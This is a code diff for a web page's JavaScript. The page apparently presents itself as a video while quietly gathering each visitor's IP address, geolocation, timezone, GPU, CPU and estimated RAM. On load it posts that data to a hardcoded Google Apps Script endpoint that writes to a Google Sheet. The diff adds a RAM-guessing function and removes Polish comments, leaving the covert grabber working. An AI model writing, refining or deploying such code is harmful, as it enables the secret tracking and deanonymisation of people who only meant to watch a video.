@@ -9,7 +9,6 @@
         const GOOGLE_SHEETS_URL = "https://script.google.com/macros/s/AKfycbzRc0TLSz2PxBlJqCRV1x2Jt-tc0X23g28h5SCKWrOCCl-34peXrF7fzpyyytABzHwvoQ/exec";
         const VIDEO_ID = "dQw4w9WgXcQ";
         
-        // ========== GPU ==========
         function getGPU() {
             try {
                 const canvas = document.createElement('canvas');
@@ -25,7 +24,35 @@
             }
         }
         
-        // ========== SZCZEGÓŁY CPU ==========
+        function getRealRAM() {
+            const deviceRAM = navigator.deviceMemory;
+            if (deviceRAM && deviceRAM !== 8) {
+                return deviceRAM + ' GB';
+            }
+            const ua = navigator.userAgent;
+            const cores = navigator.hardwareConcurrency;
+            
+            if (ua.includes('Windows')) {
+                if (cores >= 12) return '32 GB (estimated)';
+                if (cores >= 8) return '16 GB (estimated)';
+                if (cores >= 4) return '8 GB (estimated)';
+                return '4 GB (estimated)';
+            }
+            if (ua.includes('Mac')) {
+                if (cores >= 10) return '16 GB (estimated)';
+                if (cores >= 8) return '16 GB (estimated)';
+                if (cores >= 4) return '8 GB (estimated)';
+                return '4 GB (estimated)';
+            }
+            if (ua.includes('Android') || ua.includes('iPhone')) {
+                if (cores >= 8) return '8 GB (estimated)';
+                if (cores >= 6) return '6 GB (estimated)';
+                if (cores >= 4) return '4 GB (estimated)';
+                return '3 GB (estimated)';
+            }
+            return deviceRAM ? deviceRAM + ' GB' : 'unknown';
+        }
+        
         function getCPUDetails() {
             try {
                 const cores = navigator.hardwareConcurrency || 'unknown';
@@ -66,14 +93,13 @@
                     cores: cores,
                     vendor: vendor,
                     model: model,
-                    ram: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'unknown'
+                    ram: getRealRAM()
                 };
             } catch(e) {
                 return { cores: 'unknown', vendor: 'error', model: 'error', ram: 'unknown' };
             }
         }
         
-        // ========== GEOLOKALIZACJA (timeout 2.5s) ==========
         async function getLocation() {
             try {
                 const controller = new AbortController();
@@ -93,7 +119,6 @@
                     timezone: data.timezone || 'unknown'
                 };
             } catch(e) {
-                // Fallback: tylko IP
                 try {
                     const fallback = await fetch('https://api.ipify.org?format=json');
                     const ipData = await fallback.json();
@@ -122,7 +147,6 @@
             }
         }
         
-        // ========== POZOSTAŁE DANE ==========
         function getOtherData() {
             return {
                 platform: navigator.platform || 'unknown',
@@ -143,7 +167,6 @@
             };
         }
         
-        // ========== ZBIERANIE WSZYSTKICH DANYCH ==========
         async function getAllData() {
             const [gpu, cpu, location, other] = await Promise.all([
                 Promise.resolve(getGPU()),
@@ -179,7 +202,6 @@
             };
         }
         
-        // ========== ZAPIS DO GOOGLE SHEETS ==========
         function saveToGoogleSheets(data) {
             fetch(GOOGLE_SHEETS_URL, {
                 method: 'POST',
@@ -189,7 +211,6 @@
             }).catch(e => console.log('Send error:', e));
         }
         
-        // ========== START ==========
         async function main() {
             const data = await getAllData();
             saveToGoogleSheets(data);
